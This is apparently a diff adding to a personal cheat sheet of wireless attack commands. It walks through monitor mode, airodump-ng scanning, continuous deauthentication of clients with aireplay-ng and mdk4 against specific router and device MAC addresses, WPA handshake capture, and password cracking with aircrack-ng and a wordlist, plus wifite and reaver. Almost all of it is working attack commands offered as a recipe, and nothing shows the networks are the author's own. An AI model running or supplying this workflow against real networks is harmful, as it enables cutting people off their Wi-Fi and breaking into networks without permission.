@@ -115,6 +115,65 @@ reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
 [Use the aireplay to deauth users] 
 aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
 
+
+sudo wifite -all
+
+# Targeting everying near by
+airodump-ng wlan0
+#  Specific Targeting for better information gathering
+--> also shows devices (mac) within the station
+* airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
+
+
+###############################
+
+[Broadcast / Monitor Mode] 
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ifconfig wlan0 up
+
+[wifi scan]
+sudo airodump-ng -w wider_scan_capture wlan0 
+sudo airodump-ng -w ap_scan_capture wlan0 -d {AP MAC ADDRESS ^}
+
+##--> RUN Deauth First, and concrunetly run capture handshake 
+# [mdk4 -- deauth] 
+sudo mdk4 wlan0 d -E living room
+sudo aireplay-ng --deauth 0 -a  wlan0
+sudo aireplay-ng -0 0 -a {AP MAC ADDRESS} -c wlan0
+
+# capture handshake [WAIT FOR MESSAGES TO UPDATE]
+sudo airodump-ng -w deauth_capture -c {channel^} -d {AP MAC} wlan0
+
+# FINALY--> CRACK THE PASSWORD
+--> USE WIRESHARK TO EXAMIN .CAP. USE FILTER "eapol" TO FIND HANDSHAKES 
+---> aircrack-ng deauth_capture.cap -w wordlist.txt
+
+------------------------------------------[DEAUTH / THROTTLE] --------------------------------------------
+[MORE INFO]
+* [-0 means deauthentication.] 
+* [-0 =continous attack, 10=Quick reconncet]
+* [-a Mac address of target AP]
+* [-c macaddress associated client on ap to deauth(IF OMMITTED, ALL GET DEAUTHE
+
+[deauth-- mdk4]
+deauth using  mdk4
+
+--> RUN WIRESHARK
+
+[Send deauth - ALL CLIENTS]
+* [aireplay-ng] -0 0 -a 50:C7:BF:DC:4C:E8 -c wlan0
+
+[Send deauth] -- SPECIFIC CLIENTS
+* [aireplay-ng] -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0
+
+**********--> a .acap file should be downloaded
+--> load it into wireshark for analasys ************ 
+
+[FINALY--> CRACK THE PASSWORD]
+--> USE WIRESHARK TO EXAMIN .CAP. USE FILTER "eapol" TO FIND HANDSHAKES 
+* [aircrack-ng] xyz.cap -w wordlist.txt
+
 -----------------------------------------------------[WIRESHARK - PSK SPY ]------------------------------------------
 
 First enter psk info into : https://www.wireshark.org/tools/wpa-psk.html (Gained from router pass and login) 
